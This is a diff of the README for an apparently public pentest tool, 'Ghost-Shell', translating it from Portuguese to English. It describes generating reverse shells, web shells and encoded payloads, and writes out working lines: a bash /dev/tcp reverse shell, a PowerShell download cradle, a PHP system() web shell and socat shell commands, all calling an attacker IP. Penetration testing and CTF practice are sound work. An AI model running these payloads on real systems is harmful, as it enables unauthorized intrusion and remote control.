@@ -1,123 +1,99 @@
 # Ghost-Shell
 
-> By Gh0st-Bx1 | [github.com/Ghost-Bx1](https://github.com/Ghost-Bx1)
+> Reverse shell, web shell, and payload encoder for 25+ languages and 9 web shell types.
 
-Gerador completo de reverse shells, web shells e encoders para pentest e CTF. Suporta 25+ linguagens, 9 tipos de web shell e multiplos formatos de encoding.
+```
+  GHOST-SHELL  v1.0.0  |  Reverse Shell & Web Shell Generator
+  By Gh0st-Bx1         |  github.com/Ghost-Bx1
+```
 
----
-
-## Funcionalidades
-
-| Modulo | Descricao |
-|---|---|
-| `gen` | Gerar payload de reverse shell para IP/porta especificados |
-| `webshell` | Gerar web shell (PHP, ASP, ASPX, JSP, Node.js) |
-| `encode` | Codificar payload em Base64, URL, Hex e outros formatos |
-| `list` | Listar todos os shells e tipos de web shell disponiveis |
+![Python](https://img.shields.io/badge/Python-3.6%2B-blue?style=flat-square)
+![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20Windows-lightgrey?style=flat-square)
+![Category](https://img.shields.io/badge/Category-Payload%20Generation-red?style=flat-square)
 
 ---
 
-## Shells suportados (`gen`)
+## Overview
 
-| Tipo | Descricao |
-|---|---|
-| `bash` | Bash TCP redirect |
-| `bash_196` | Bash com file descriptor 196 |
-| `bash_udp` | Bash UDP |
-| `sh` | /bin/sh TCP |
-| `nc` | Netcat tradicional |
-| `nc_openbsd` | Netcat OpenBSD (sem -e) |
-| `nc_windows` | Netcat Windows |
-| `python2` | Python 2 socket |
-| `python3` | Python 3 socket |
-| `php` | PHP one-liner |
-| `php_shell` | PHP shell_exec |
-| `perl` | Perl socket |
-| `ruby` | Ruby TCPSocket |
-| `golang` | Go net.Conn |
-| `java` | Java Runtime.exec |
-| `groovy` | Groovy (Jenkins) |
-| `nodejs` | Node.js net.Socket |
-| `lua` | Lua socket |
-| `awk` | AWK /inet/tcp |
-| `socat` | Socat exec |
-| `socat_static` | Socat PTY estatico |
-| `powershell` | PowerShell TCP |
-| `powershell_b64` | PowerShell Base64 encoded |
-| `cmd_certutil` | CMD + certutil download |
-| `msfvenom_hint` | Comando msfvenom sugerido |
+Ghost-Shell generates ready-to-use reverse shells, web shells, and encoded payloads. It covers 25+ languages and shell types, 9 web shell variants, and multiple encoding formats including Base64 UTF-16LE for PowerShell one-liners.
+
+| Module     | Description                                                      |
+|------------|------------------------------------------------------------------|
+| `gen`      | Generate reverse shell payload for a given IP and port           |
+| `webshell` | Generate web shell (PHP, ASP, ASPX, JSP, Node.js)               |
+| `encode`   | Encode payload: Base64, URL, Hex, double URL, Base64 UTF-16LE   |
+| `list`     | List all available shells and web shell types                    |
 
 ---
 
-## Web shells suportados (`webshell`)
+## Requirements
 
-| Tipo | Descricao |
-|---|---|
-| `php_cmd` | PHP system() simples |
-| `php_passthru` | PHP passthru() |
-| `php_shell_exec` | PHP shell_exec() |
-| `php_senha` | PHP com autenticacao MD5 |
-| `php_upload` | PHP com upload de arquivo |
-| `asp_classic` | ASP classico |
-| `aspx` | ASP.NET C# |
-| `jsp` | Java Server Pages |
-| `nodejs` | Node.js Express handler |
+```
+Python 3.6+
+No external dependencies (stdlib only)
+nc or ncat in PATH (required for --listen)
+```
 
 ---
 
-## Instalacao
+## Installation
 
 ```bash
-# Sem dependencias obrigatorias - stdlib Python 3 apenas
+git clone https://github.com/Ghost-Bx1/ghost-shell
+cd ghost-shell
 python ghost-shell.py --help
 ```
 
-Para iniciar listener automatico:
-```bash
-# nc ou ncat devem estar no PATH
-which nc ncat
-```
-
 ---
 
-## Uso
+## Usage
+
+### Reverse shell generation
 
 ```bash
-# Listar todos os shells disponiveis
+# List all available shells
 python ghost-shell.py list
 
-# Gerar payload bash para IP/porta
+# Generate all shells for a given IP/port
 python ghost-shell.py gen -i 10.10.10.5 -p 4444
 
-# Gerar shell especifico
+# Generate a specific shell type
 python ghost-shell.py gen -i 10.10.10.5 -p 4444 -s python3
 
-# Gerar todos os shells de uma vez
+# Generate all shells at once
 python ghost-shell.py gen -i 10.10.10.5 -p 4444 --all
 
-# Gerar e iniciar listener automaticamente
+# Generate and start listener automatically
 python ghost-shell.py gen -i 10.10.10.5 -p 4444 -s bash --listen
+```
 
-# Web shell PHP simples
+### Web shell generation
+
+```bash
+# Simple PHP command shell
 python ghost-shell.py webshell -t php_cmd
 
-# Web shell PHP com senha
-python ghost-shell.py webshell -t php_senha --senha minhasenha
+# PHP shell with password authentication
+python ghost-shell.py webshell -t php_senha --senha mypassword
 
-# Web shell ASPX
+# ASP.NET shell
 python ghost-shell.py webshell -t aspx
 
-# Salvar web shell em arquivo
+# Save to file
 python ghost-shell.py webshell -t php_cmd -o shell.php
+```
 
-# Codificar payload em base64
+### Payload encoding
+
+```bash
+# Base64
 python ghost-shell.py encode -d "bash -i >& /dev/tcp/10.10.10.5/4444 0>&1" -e base64
 
-# Codificar em URL encoding
+# URL encoding
 python ghost-shell.py encode -d "<?php system(\$_GET['cmd']); ?>" -e url
 
-# Codificar em hex
-python ghost-shell.py encode -d "payload aqui" -e hex
+# Hex
+python ghost-shell.py encode -d "payload here" -e hex
 
 # Base64 UTF-16LE (PowerShell)
 python ghost-shell.py encode -d "IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.5/shell.ps1')" -e base64_utf16
@@ -125,99 +101,112 @@ python ghost-shell.py encode -d "IEX(New-Object Net.WebClient).DownloadString('h
 
 ---
 
-## Saida exemplo
+## Supported Shell Types
 
-```
-  Ghost-Shell v1.0.0  |  Reverse Shell & Web Shell Generator
+| Type              | Description                          |
+|-------------------|--------------------------------------|
+| `bash`            | Bash TCP redirect                    |
+| `bash_196`        | Bash with file descriptor 196        |
+| `bash_udp`        | Bash UDP                             |
+| `sh`              | /bin/sh TCP                          |
+| `nc`              | Netcat classic                       |
+| `nc_openbsd`      | Netcat OpenBSD (no -e flag)          |
+| `nc_windows`      | Netcat Windows                       |
+| `python2`         | Python 2 socket                      |
+| `python3`         | Python 3 socket                      |
+| `php`             | PHP one-liner                        |
+| `php_shell`       | PHP shell_exec                       |
+| `perl`            | Perl socket                          |
+| `ruby`            | Ruby TCPSocket                       |
+| `golang`          | Go net.Conn                          |
+| `java`            | Java Runtime.exec                    |
+| `groovy`          | Groovy (Jenkins)                     |
+| `nodejs`          | Node.js net.Socket                   |
+| `lua`             | Lua socket                           |
+| `awk`             | AWK /inet/tcp                        |
+| `socat`           | Socat exec                           |
+| `socat_static`    | Socat PTY static binary              |
+| `powershell`      | PowerShell TCP                       |
+| `powershell_b64`  | PowerShell Base64 encoded            |
+| `cmd_certutil`    | CMD + certutil download cradle       |
+| `msfvenom_hint`   | Suggested msfvenom command           |
 
-  [=] REVERSE SHELLS  |  IP: 10.10.10.5  |  PORTA: 4444
+## Supported Web Shells
 
-  [bash]
-  bash -i >& /dev/tcp/10.10.10.5/4444 0>&1
-
-  [python3]
-  python3 -c 'import socket,subprocess,os;s=socket.socket(...)...'
-
-  [php]
-  php -r '$sock=fsockopen("10.10.10.5",4444);...'
-
-  [powershell_b64]
-  powershell -enc JABjAGwAaQBlAG4AdAAgAD0A...
-
-  [=] ESTABILIZACAO DO SHELL
-  1. python3 -c 'import pty;pty.spawn("/bin/bash")'
-  2. Ctrl+Z -> stty raw -echo; fg
-  3. export TERM=xterm
-```
-
----
-
-## Opcoes completas
-
-### `gen` - Gerar reverse shell
-
-```
-opcoes:
-  -i IP                 IP para conexao reversa (seu IP)
-  -p PORTA              Porta para conexao reversa
-  -s SHELL              Tipo de shell especifico (default: mostrar todos)
-  --all                 Mostrar todos os shells disponiveis
-  --listen              Iniciar listener nc/ncat apos gerar
-```
-
-### `webshell` - Gerar web shell
-
-```
-opcoes:
-  -t TIPO               Tipo: php_cmd, php_passthru, php_shell_exec, php_senha,
-                        php_upload, asp_classic, aspx, jsp, nodejs
-  --senha SENHA         Senha para autenticacao (php_senha)
-  -o FILE               Salvar em arquivo
-```
-
-### `encode` - Codificar payload
-
-```
-opcoes:
-  -d DADOS              Payload a codificar
-  -e ENCODING           Tipo: base64, base64_utf16, url, double_url, hex
-```
-
-### `list` - Listar shells
-
-```
-  Sem argumentos - lista todos os shells e web shells disponiveis
-```
+| Type              | Description                          |
+|-------------------|--------------------------------------|
+| `php_cmd`         | PHP system() - simple                |
+| `php_passthru`    | PHP passthru()                       |
+| `php_shell_exec`  | PHP shell_exec()                     |
+| `php_senha`       | PHP with MD5 password authentication |
+| `php_upload`      | PHP with file upload capability      |
+| `asp_classic`     | Classic ASP                          |
+| `aspx`            | ASP.NET C#                           |
+| `jsp`             | Java Server Pages                    |
+| `nodejs`          | Node.js Express handler              |
 
 ---
 
-## Tecnicas de estabilizacao de shell
+## Shell Stabilization
 
-Apos receber a conexao reversa:
+After receiving the connection:
 
 ```bash
-# 1. Python PTY
+# Python PTY
 python3 -c 'import pty;pty.spawn("/bin/bash")'
-Ctrl+Z
+# Ctrl+Z
 stty raw -echo; fg
 export TERM=xterm
 
-# 2. Socat interativo (upload socat estatico no alvo)
+# Socat (requires static binary on target)
 socat file:`tty`,raw,echo=0 tcp-listen:4445
-# No alvo:
-socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:SEU_IP:4445
+# On target:
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:YOUR_IP:4445
 
-# 3. script /dev/null
+# script method
 script /dev/null -c bash
-Ctrl+Z
+# Ctrl+Z
 stty raw -echo; fg
 
-# 4. rlwrap
+# rlwrap
 rlwrap nc -lvnp 4444
 ```
 
 ---
 
-## Aviso Legal
+## Reference
 
-Uso exclusivo para pesquisa de seguranca, pentest autorizado, CTF e fins educacionais. O uso nao autorizado contra sistemas de terceiros e ilegal. Os autores nao se responsabilizam pelo uso indevido.
+### `gen` flags
+
+| Flag          | Description                                   |
+|---------------|-----------------------------------------------|
+| `-i IP`       | Attacker IP for reverse connection            |
+| `-p PORT`     | Port for reverse connection                   |
+| `-s SHELL`    | Specific shell type (default: show all)       |
+| `--all`       | Show all available shell types                |
+| `--listen`    | Start nc/ncat listener after generating       |
+
+### `webshell` flags
+
+| Flag          | Description                                   |
+|---------------|-----------------------------------------------|
+| `-t TYPE`     | Web shell type (see table above)              |
+| `--senha`     | Password for php_senha authentication         |
+| `-o FILE`     | Save to file                                  |
+
+### `encode` flags
+
+| Flag          | Description                                               |
+|---------------|-----------------------------------------------------------|
+| `-d DATA`     | Payload to encode                                         |
+| `-e ENCODING` | Type: base64, base64_utf16, url, double_url, hex          |
+
+---
+
+## Disclaimer
+
+For use in authorized environments only. Penetration testing, CTF competitions, and offensive security research with explicit permission from the environment owner. The author is not responsible for misuse.
+
+---
+
+**By [Gh0st-Bx1](https://github.com/Ghost-Bx1)**
